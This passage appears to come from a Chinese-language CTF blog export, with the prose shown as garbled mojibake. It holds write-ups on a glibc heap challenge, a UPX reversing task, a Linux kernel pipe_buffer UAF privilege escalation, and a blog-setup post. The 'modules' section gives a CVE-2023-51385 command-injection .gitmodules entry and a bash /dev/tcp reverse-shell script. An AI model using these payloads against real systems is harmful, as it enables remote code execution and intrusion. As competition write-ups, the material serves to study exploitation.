<figure class="highlight patch"><table><tr><td class="code"><pre><span class="line"><span class="comment">diff --git a/libio/libioP.h b/libio/libioP.h</span></span><br><span class="line"><span class="comment">index 745278e..b3858d1 100644</span></span><br><span class="line"><span class="comment">--- a/libio/libioP.h</span></span><br><span class="line"><span class="comment">+++ b/libio/libioP.h</span></span><br><span class="line"><span class="meta">@@ -100,7 +100,7 @@</span></span><br><span class="line"> #define _IO_JUMPS_FILE_plus(THIS) \</span><br><span class="line">   _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE_plus, vtable)</span><br><span class="line"> #define _IO_WIDE_JUMPS(THIS) \</span><br><span class="line"><span class="deletion">-  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable</span></span><br><span class="line"><span class="addition">+  (IO_validate_vtable(_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)-&gt;_wide_vtable))</span></span><br><span class="line"> #define _IO_CHECK_WIDE(THIS) \</span><br><span class="line">   (_IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data) != NULL)</span><br></pre></td></tr></table></figure>

<p>ç¨‹åºä¸éœ€è¦è‡ªå·±patchï¼ŒæŒ‡å®šäº†runpath</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc -Wl,-R/path/to/library xxx.c                   <span class="comment"># æŒ‡å®šlibc</span></span><br><span class="line">$ <span class="built_in">export</span> LD_RUN_PATH=/path/to/library  <span class="comment"># æˆ–è€…</span></span><br><span class="line">$ ldd houseofsome</span><br><span class="line">	linux-vdso.so.1 (0x00007ffcca981000)</span><br><span class="line">	libc.so.6 =&gt; ./libc.so.6 (0x00007fbff2200000)</span><br><span class="line">	./ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007fbff24e6000)</span><br></pre></td></tr></table></figure>

<p>mmap äº†ä¸€æ®µå¯è¯»å¯å†™çš„å†…å­˜</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line"><span class="number">0x114514000</span>        <span class="number">0x114515000</span> rw-p     <span class="number">1000</span>      <span class="number">0</span> [anon_114514] </span><br></pre></td></tr></table></figure>

<p>draw æ—¶ï¼Œå› ä¸ºæ²¡æœ‰åˆ¤æ–­offsetçš„å€¼ï¼Œå­˜åœ¨æº¢å‡ºé—®é¢˜</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 <span class="title">draw</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 offset; <span class="comment">// [rsp+0h] [rbp-120h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !magic</span><br><span class="line">    &amp;&amp; dev</span><br><span class="line">    &amp;&amp; name</span><br><span class="line">    &amp;&amp; (<span class="built_in">printf</span>(<span class="string">&quot;offset&gt; &quot;</span>), offset = <span class="built_in">getint</span>(), <span class="built_in">printf</span>(<span class="string">&quot;length&gt; &quot;</span>), (<span class="type">unsigned</span> __int64)<span class="built_in">getint</span>() &lt;= <span class="number">8</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">fread</span>((<span class="type">void</span> *)(offset + <span class="number">0x114514000</span>LL), <span class="number">1uLL</span>, <span class="number">1uLL</span>, dev);</span><br><span class="line">    magic = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è®°ä¸€ä¸‹çŸ¥è¯†ç‚¹ï¼š</p>
<ul>
<li>fopenå‡½æ•°ä¼šmallocä¸€ä¸ªå †å—ä½œä¸º<code>_IO_FILE</code>ç®¡ç†ç»“æ„ï¼Œå¹¶å¤´æ’è¿›å…¥<code>_IO_list_all</code>ï¼Œä½¿å¾—libcå†…ä¼šå­˜æ”¾ä¸€ä¸ªå †åœ°å€</li>
<li>scanf åœ¨è¾“å…¥ <code>+/-</code> å­—ç¬¦æ—¶ï¼Œå ä½ä½†æ˜¯ä¸è¦†ç›–ï¼Œé€ æˆæ³„éœ²æ ˆ</li>
</ul>
<p>HouseOfSomeå…·ä½“WPè§å®˜æ–¹ï¼Œæœ‰æ—¶é—´å†çœ‹ï¼š<a href="https://mp.weixin.qq.com/s/BBc-HCET6W91-tpVSs4PxQ">2023å¹´æ˜¥ç§‹æ¯å†¬å­£èµ›WEBã€PWNç±»é¢˜ç›®è§£æ</a></p>
<h2 id="upx2023"><a href="#upx2023" class="headerlink" title="upx2023"></a>upx2023</h2><p>010editoræ‰“å¼€ï¼Œå°†å…¶ä¸­çš„ <code>upx</code> æ”¹æˆ <code>UPX</code>, ç„¶åä½¿ç”¨<code>upx -d</code> è„±å£³å°±è¡Œ</p>
<p>å…¶ä¸»è¦é€»è¾‘å¦‚ä¸‹</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  std::ostream *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v6[<span class="number">44</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">42</span>]; <span class="comment">// [rsp+D0h] [rbp+50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+104h] [rbp+84h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> Seed; <span class="comment">// [rsp+108h] [rbp+88h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10Ch] [rbp+8Ch]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  Seed = <span class="built_in">time</span>(<span class="number">0</span>i64);</span><br><span class="line">  <span class="built_in">srand</span>(Seed);</span><br><span class="line">  std::string::<span class="built_in">string</span>((std::string *)input);</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;((std::ostream *)&amp;std::cout, Str);</span><br><span class="line">  std::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="type">char</span>&gt;((std::istream *)&amp;std::cin, (std::string *)input);</span><br><span class="line">  std::string::<span class="built_in">string</span>((std::string *)&amp;input[<span class="number">32</span>], (<span class="type">const</span> std::string *)input);</span><br><span class="line">  <span class="built_in">change</span>((std::string *)&amp;input[<span class="number">16</span>], (std::string *)&amp;input[<span class="number">32</span>]);<span class="comment">// çŸ©é˜µè½¬ç½®</span></span><br><span class="line">  std::string::<span class="keyword">operator</span>=(input, &amp;input[<span class="number">16</span>]);</span><br><span class="line">  std::string::~<span class="built_in">string</span>((std::string *)&amp;input[<span class="number">16</span>]);</span><br><span class="line">  std::string::~<span class="built_in">string</span>((std::string *)&amp;input[<span class="number">32</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( std::string::<span class="built_in">length</span>((std::string *)input) != <span class="number">42</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (std::ostream *)std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;((std::ostream *)&amp;std::cout, <span class="string">&quot;len error&quot;</span>);</span><br><span class="line">    std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;(v3);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">qmemcpy</span>(v6, &amp;unk_46A020, <span class="number">0xA8</span>ui64);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">41</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="built_in">rand</span>() % <span class="number">255</span>;</span><br><span class="line">    v4 = (<span class="type">char</span> *)std::string::<span class="keyword">operator</span>[](input, i);</span><br><span class="line">    <span class="keyword">if</span> ( (v8 ^ *v4) != v6[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  std::string::~<span class="built_in">string</span>((std::string *)input);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¼‚æˆ–é—®é¢˜ï¼š<strong>çˆ†ç ´æ—¶é—´æˆ³ï¼ˆæ ¹æ®å·²çŸ¥å­—ç¬¦ï¼Œå‰ä¸¤ä¸ªå­—ç¬¦å›ºå®šä¸º <code>f&#123;</code>ï¼‰</strong>ã€‚change å‡½æ•°æ˜¯ä¸€ä¸ªçŸ©é˜µè½¬åŒ–ï¼Œå› æ­¤å¯ä»¥ç›´æ¥ä½¿ç”¨å­—ç¬¦ä¸²æµ‹è¯•ï¼Œå¹¶ä¸”å¾—åˆ°å…¶mappingï¼Œæœ€åå¾—åˆ°å…¶ç»“æœ</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">t1 = <span class="built_in">list</span>(<span class="string">&quot;abcdefghijklmnopqrstuvwxyz1234567890ABCDEF&quot;</span>)</span><br><span class="line">r1 = <span class="built_in">list</span>(<span class="string">&quot;aeimquy37AEbdfhjlnprtvxz24680BDFcgkosw159C&quot;</span>)</span><br><span class="line"></span><br><span class="line">t2 = <span class="string">&quot;flag&#123;abcdefghijklmnopqrstuvwxyz1234567890&#125;&quot;</span></span><br><span class="line">r2 = <span class="string">&quot;f&#123;dhlptx260lgacegikmoqsuwy13579&#125;abfjnrvz48&quot;</span></span><br><span class="line"></span><br><span class="line">mapping = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, c in <span class="built_in">enumerate</span>(t1):</span><br><span class="line">    <span class="keyword">for</span> j, v in <span class="built_in">enumerate</span>(r1):</span><br><span class="line">        <span class="keyword">if</span> c == v:</span><br><span class="line">            mapping[i] = j</span><br><span class="line"><span class="built_in">print</span>(mapping)</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    assert t2[i] == r2[mapping[i]]</span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">list</span>(<span class="string">&quot;f&#123;52bgb-281lg00ff-46f7-ca009c8e&#125;a381-b7191&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">for</span> i in <span class="title">range</span><span class="params">(<span class="number">42</span>)</span>:</span></span><br><span class="line"><span class="function">    print(flag[mapping[i]], end=</span><span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="modules"><a href="#modules" class="headerlink" title="modules"></a>modules</h2><p>CVE-2023-51385<del>ï¼ˆgitee æœç´¢å°±æœ‰ç­”æ¡ˆ</del></p>
<p>å¦‚ä½•åˆ©ç”¨çœ‹ä¸‹é¢ä¸¤ç¯‡æ–‡ç« å°±è¡Œ</p>
<ul>
<li><a href="https://blog.csdn.net/mirocky/article/details/135485164">CVE-2023-51385 OpenSSH ProxyCommandå‘½ä»¤æ³¨å…¥æ¼æ´</a></li>
<li><a href="https://vin01.github.io/piptagole/ssh/security/openssh/libssh/remote-code-execution/2023/12/20/openssh-proxycommand-libssh-rce.html">SSH ProxyCommand  (CVE-2023-51385ï¼‰</a></li>
</ul>
<p>æ–°å»ºä¸€ä¸ª <code>gitee</code> ä»“åº“ï¼Œæ·»åŠ ä¸€ä¸ª <code>.gitmodules</code> æ–‡ä»¶ï¼Œåå¼¹shellã€‚åé¢çš„åŸŸåéœ€è¦ä¸ <code>.config</code> æ–‡ä»¶ä¸€è‡´</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[submodule &quot;cves&quot;]</span><br><span class="line">  path = cves</span><br><span class="line">  url = ssh://`bash exp.sh`foo.ichunqiu.com/bar</span><br></pre></td></tr></table></figure>

<p>åœ¨åº“é‡Œåˆ›å»ºä¸€ä¸ª <code>exp.sh</code> æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>clone ä»“åº“è§¦å‘æ¼æ´</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> &lt;repo&gt; --recurse-submodules</span><br></pre></td></tr></table></figure>

<p>æ¯”èµ›æ—¶ curl ä¸»æœºæ²¡æœ‰å›æ˜¾ï¼Œåœ¨èµ›åæ‰æƒ³åˆ°å¯èƒ½æ˜¯<code>VPS é˜²ç«å¢™</code>çš„é—®é¢˜</p>
<ul>
<li>ç„¶åcurläº†ä¸€ä¸‹vpsï¼Œå‘ç°æ²¡æœ‰æ¥æ”¶åˆ°ï¼Œåæ¥åˆå‘ç° 4444 ç«¯å£ä¸è¡Œï¼Œæ¢æˆ 9999 ç«¯å£å°±è¡ŒğŸ˜¥</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ufw allow port</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>init-blog</title>
    <url>/2023/03/19/init-blog/</url>
    <content><![CDATA[<blockquote>
<p>blog init</p>
</blockquote>
<span id="more"></span>

<h1 id="æ­å»ºåšå®¢"><a href="#æ­å»ºåšå®¢" class="headerlink" title="æ­å»ºåšå®¢"></a>æ­å»ºåšå®¢</h1><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>github + hexo</p>
<h3 id="hexoä½¿ç”¨"><a href="#hexoä½¿ç”¨" class="headerlink" title="hexoä½¿ç”¨"></a>hexoä½¿ç”¨</h3><p><code>hexo</code> å‘½ä»¤æŠ¥é”™ï¼Œä¸Šç½‘æŸ¥ï¼Œä½¿ç”¨ <code>npx hexo</code></p>
<p>æ’ä»¶ä¸‹è½½</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure>

<p>å¸¸ç”¨å‘½ä»¤</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npx hexo init <span class="comment"># åˆå§‹åŒ–ä¸€ä¸ªä»“åº“</span></span><br><span class="line">npx hexo clean</span><br><span class="line">npx hexo g   <span class="comment"># é™æ€ç•Œé¢ç”Ÿæˆ</span></span><br><span class="line">npx hexo s   <span class="comment"># æœ¬åœ°å¯åŠ¨ service</span></span><br><span class="line">npx hexo d   <span class="comment"># æ’ä»¶ã€‚ä¼ åˆ°github</span></span><br><span class="line"></span><br><span class="line">npx hexo new page &lt;name&gt; <span class="comment"># ç”Ÿæˆç›®å½•</span></span><br><span class="line">npx hexo new &lt;name&gt;.md   <span class="comment">#ç”Ÿæˆæ–‡ç« </span></span><br></pre></td></tr></table></figure>

<p>å¸¸ç”¨å±æ€§</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">title: æ ‡é¢˜ï¼Œ ä½¿ç”¨ &#123;&#123;title&#125;&#125;</span><br><span class="line"><span class="built_in">date</span>: æ—¥æœŸ, ä½¿ç”¨ &#123;&#123;<span class="built_in">date</span>&#125;&#125;</span><br><span class="line">updated: æ›´æ–°</span><br><span class="line">tags: æ ‡ç­¾</span><br><span class="line">categories: åˆ†ç±»</span><br><span class="line">comments: å¼€å¯è¯„è®º <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<h3 id="æœ¬åœ°"><a href="#æœ¬åœ°" class="headerlink" title="æœ¬åœ°"></a>æœ¬åœ°</h3><ul>
<li>obsidian å†™md</li>
<li>vscode</li>
</ul>
<h2 id="æŒç»­å­¦ä¹ "><a href="#æŒç»­å­¦ä¹ " class="headerlink" title="æŒç»­å­¦ä¹ "></a>æŒç»­å­¦ä¹ </h2><ul>
<li>ç®€å•ç‚¹ä¹Ÿè¿˜è¡Œï¼Œä¸æƒ³æŠ˜è…¾äº†ã€‚</li>
<li>å®˜ç½‘ + googleï¼Œæ»¡è¶³ä¸€åˆ‡è¦æ±‚</li>
</ul>
<p><a href="https://hexo.io/zh-cn/docs/">ä¸­æ–‡æ–‡æ¡£</a></p>
]]></content>
      <categories>
        <category>MISC</category>
      </categories>
      <tags>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>mimic-water-ker</title>
    <url>/2023/11/11/mimic%20water-ker/</url>
    <content><![CDATA[<blockquote>
<p>å·®ç‚¹æŠ„æ˜ç™½äº†</p>
</blockquote>
<span id="more"></span>

<h2 id="water-ker"><a href="#water-ker" class="headerlink" title="water-ker"></a>water-ker</h2><p>å†…æ ¸é¢˜ç›®ï¼Œæƒé™æ­£ç¡®ï¼Œä¿æŠ¤å…¨å¼€ï¼Œå”¯ä¸€ä¸å¥½çš„å°±æ˜¯æ²¡æœ‰æä¾› <code>.config</code> æ–‡ä»¶</p>
<p>è¿è¡Œæ—¶ä¿æŠ¤å…¨å¼€ï¼ŒæŸ¥çœ‹ LKM</p>
<ul>
<li>åˆ›å»ºä¸€ä¸ªchunkã€‚</li>
<li>å¯ä»¥freeï¼Œå¹¶ä¸”å­˜åœ¨UAFã€‚</li>
<li>å¯ä»¥ edit 1å­—èŠ‚ã€‚</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">water_ioctl</span><span class="params">(file *file, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  __int64 arg_; <span class="comment">// rdx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  edit_args args; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v8 = v3;</span><br><span class="line">  v7 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">copy_from_user</span>(&amp;args, arg_, <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( delete_idx &lt;= <span class="number">0</span> &amp;&amp; chunk )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">kfree</span>();                              <span class="comment">// uaf dangling pointer</span></span><br><span class="line">                                                <span class="comment">// chunk = 0</span></span><br><span class="line">          ++delete_idx;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x50</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">copy_from_user</span>(&amp;args, arg_, <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( edit_idx &lt;= <span class="number">0</span> &amp;&amp; chunk &amp;&amp; !<span class="built_in">copy_from_user</span>(chunk, args.buf, <span class="number">1LL</span>) )<span class="comment">// pipe pages</span></span><br><span class="line">        &#123;</span><br><span class="line">          ++edit_idx;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x20</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">copy_from_user</span>(&amp;args, arg_, <span class="number">8LL</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !chunk )</span><br><span class="line">        &#123;                                       <span class="comment">// void *kmalloc_trace(struct kmem_cache *s, gfp_t flags, size_t size)</span></span><br><span class="line">          chunk = (<span class="type">unsigned</span> __int8 *)<span class="built_in">kmalloc_trace</span>(kmalloc_caches[<span class="number">51</span>], <span class="number">4197568LL</span>, <span class="number">0x200</span>LL);</span><br><span class="line">          <span class="keyword">if</span> ( chunk )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">copy_from_user</span>(chunk, args.buf, <span class="number">0x200</span>LL);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0xFFFFFFFFFFFFFFEA</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>chunkçš„flagï¼Œä¸æ˜¯ <code>SLAB_ACCOUNT 0x04000000</code>ï¼Œå› æ­¤æ˜¯ é€šç”¨slabã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">chunk = (<span class="type">unsigned</span> __int8 *)<span class="built_in">kmalloc_trace</span>(kmalloc_caches[<span class="number">51</span>], <span class="number">0x400CC0</span>LL, <span class="number">0x200</span>LL);</span><br></pre></td></tr></table></figure>

<p>æ€è·¯æ˜¯ä½¿ç”¨ pipe ç»“æ„ä½“çš„ page æŒ‡é’ˆï¼Œé€ æˆä»»æ„è¯»å†™ã€‚</p>
<ul>
<li>fcntl ä¿®æ”¹ pipe çš„sizeä»è€Œå¯ä»¥è·å¾—0x200å¤§å°çš„ <code>pipe_bufs ring</code></li>
<li>uaf ä¿®æ”¹ <code>pipe_buffer-&gt;pages</code> ä½¿ä¸¤ä¸ªpageæŒ‡é’ˆæŒ‡å‘åŒä¸€ä¸ªå†…å­˜</li>
<li>free ä¸€ä¸ª page å¯ä»¥ä½¿ç”¨å¦ä¸€ä¸ªpageä»»æ„è¯»å†™</li>
<li>å †å–·å°„æé«˜æˆåŠŸç‡</li>
<li>page ä½¿ç”¨kmalloc-64ã€‚0x40</li>
</ul>
<p>gdbè°ƒè¯•ï¼Œä½¿ç”¨è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># gdbscript</span><br><span class="line">file vmlinux  # éœ€è¦å…ˆå»é™¤ kaslr å¦åˆ™åœ°å€åç§»ä¸å¯¹ï¼Œæ— æ³•debug</span><br><span class="line">target remote :1234</span><br><span class="line"></span><br><span class="line"># cmd</span><br><span class="line">gdb -x gdbscript</span><br></pre></td></tr></table></figure>

<h3 id="page-level-uaf"><a href="#page-level-uaf" class="headerlink" title="page-level-uaf"></a>page-level-uaf</h3><p>pipe ç»“æ„ä½“<code>struct pipe_inode_info (size ?= 0x88)</code> æˆå‘˜ <code>pipe-&gt;bufs</code>  çš„æˆå‘˜é»˜è®¤ä¸º 10(pipe_bufs &amp;&amp; ring_size)ä¸ª <code>struct pipe_buffer</code> ï¼Œæ­¤ç»“æ„ä½“ç¬¬ä¸€ä¸ªæˆå‘˜å˜é‡ä¸º <code>struct page *page</code></p>
<ul>
<li>å †å–·å°„å¤§é‡çš„pipeï¼Œç„¶åä½¿ç”¨ <code>pipe_fcntl</code> ä¿®æ”¹  <code>ring_size</code>  çš„å¤§å°ï¼Œè®© <code>pipe-&gt;bufs</code> å¤„äº kmalloc-512ã€‚</li>
<li>å°†éƒ¨åˆ†çš„ <code>pipe_bufs</code> ä¿®æ”¹å¤§ï¼Œè¿™æ ·ä¼šè·å¾—æ¯”è¾ƒå¤šçš„ free æ‰çš„ kmalloc-512</li>
<li>æ·»åŠ chunkç„¶åfreeæ‰ï¼Œå¤„äºkmalloc-512ã€‚</li>
<li>ä½¿ç”¨<code>fcntl</code> å°†æ”¹å¤§çš„ <code>pipe_bufs</code> æ”¹å› kmalloc-512ã€‚</li>
<li>å¾€pipeä¸­å†™å†…å®¹ï¼Œ<code>alloc_pages</code> è·å¾—é¡µã€‚</li>
<li>å› ä¸ºå­˜åœ¨uafï¼Œedit ä¿®æ”¹pageæŒ‡é’ˆçš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œä½¿ä¸¤ä¸ª pipe ï¼ˆvictim, originï¼‰ æŒ‡å‘ç›¸åŒçš„ struct page</li>
<li><code>struct page</code> çš„å¤§å°çº¦ä¸º 0x40ï¼Œç›´æ¥ä¿®æ”¹ <code>\x00</code> æˆåŠŸç‡ <code>75%</code>ã€‚0x100 &#x2F; 0x40 &#x3D; 4ï¼Œå¯èƒ½æ ¹æœ¬å°±æ²¡ä¿®æ”¹ï¼Œå­˜åœ¨å¤±è´¥çš„å¯èƒ½æ€§ã€‚</li>
</ul>
<p>å¦‚æœæˆ‘ä»¬ close origin pipe ï¼Œå¯ä»¥è·å¾— uaf çš„ page</p>
<h3 id="äºŒçº§-page-level-uaf-æ„é€ è‡ªå†™ç®¡é“"><a href="#äºŒçº§-page-level-uaf-æ„é€ è‡ªå†™ç®¡é“" class="headerlink" title="äºŒçº§ page-level-uaf æ„é€ è‡ªå†™ç®¡é“"></a>äºŒçº§ page-level-uaf æ„é€ è‡ªå†™ç®¡é“</h3><p>ä¸Šä¸€æ­¥closeåï¼Œå­˜åœ¨ä¸€ä¸ªå­˜åœ¨ uaf çš„ pageï¼Œæˆ‘ä»¬å‡ ä¹å¯ä»¥ä»»æ„è¯»å†™ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç»§ç»­ä½¿ç”¨ <code>pipe_buffer</code> ç»“æ„ä½“ï¼Œåœ¨close pipeã€‚</p>
<ul>
<li>å †å–·å¤§é‡çš„ pipe</li>
<li>close origin pipeï¼Œè·å¾— free page 1</li>
<li>fcntl ä¿®æ”¹å¤§å°ï¼Œæ€»æœ‰åœ¨free page 1 çš„ pipeï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ victim è¯»å–å†…å®¹ï¼Œè·å¾—page 1ä¸Šçš„pipeå†…å®¹</li>
<li>ç„¶åå¯¹ free page 1ä¸Šçš„ pipe_buffer è¿›è¡Œ ç±»ä¼¼ uaf å†™ä¸€å­—èŠ‚çš„æ•ˆæœï¼Œä½¿ page 1 çš„ä¸¤ä¸ª pipe_buffer çš„ page æŒ‡å‘åŒä¸€ä¸ªåœ°æ–¹</li>
<li>free page 1 çš„å…¶ä¸­ä¸€ä¸ª pipeï¼Œè·å¾—ä¸€ä¸ª uaf çš„ free page 2</li>
<li>ä½¿ç”¨ pipe_buffer è¿›è¡Œè·å–ï¼Œè¿›è¡Œè¯»å†™ï¼Œä½†æ˜¯è¿™é‡Œä¿®æ”¹free page 2 pipe_buffer pageæŒ‡é’ˆä¸º  free page 1 çš„pipe_buffer çš„ pageã€‚</li>
</ul>
<p>æ¥è‡ªa3âœŒåšå®¢çš„åŸå›¾ã€‚</p>
<p><img src="https://s2.loli.net/2023/05/02/TYr8WlEushem2i3.png" alt="äºŒçº§è‡ªå†™ç®¡é“"></p>
<h3 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>è¯»å†™ç®¡é“å†…å®¹ï¼šéœ€è¦å…ˆå¾€ç®¡é“ä¸­å†™å†…å®¹ï¼Œæ‰èƒ½è¯»å–ç®¡é“å†…å®¹ã€‚è¿™æ˜¯ <code>struct pipe_buffer</code> æœ¬èº«çš„å±æ€§  <code>offset &amp; len</code> å†³å®šçš„ã€‚</p>
<ul>
<li>offset å¼€å§‹è¯»å–ï¼Œæœ€å¤šè¯»lené•¿åº¦</li>
<li>ä» offset + len åœ°æ–¹å¼€å§‹å†™å†…å®¹</li>
</ul>
<p>ä¸ºä»€ä¹ˆé€‰æ‹© 96 å’Œ 192 çš„ size</p>
<ul>
<li>kmallocå­˜åœ¨è¿™ä¸¤ä¸ªå¤§å°çš„ kmem_cacheã€‚</li>
<li>è¿™ä¸¤ä¸ªsizeåœ¨ kmalloc ä¸­ä¹Ÿæ˜¯æ¯”è¾ƒç‹¬ç‰¹çš„å­˜åœ¨ï¼Œä¸æ˜¯2çš„å¹‚æ¬¡æ–¹ï¼Œä½†æ˜¯å†…æ ¸ä¸­å¾ˆå¤šçš„ç»“æ„ä½“å¤§å°ç±»ä¼¼ï¼Œå› æ­¤ä¸“é—¨å­˜åœ¨è¿™ä¸¤ä¸ªsize</li>
</ul>
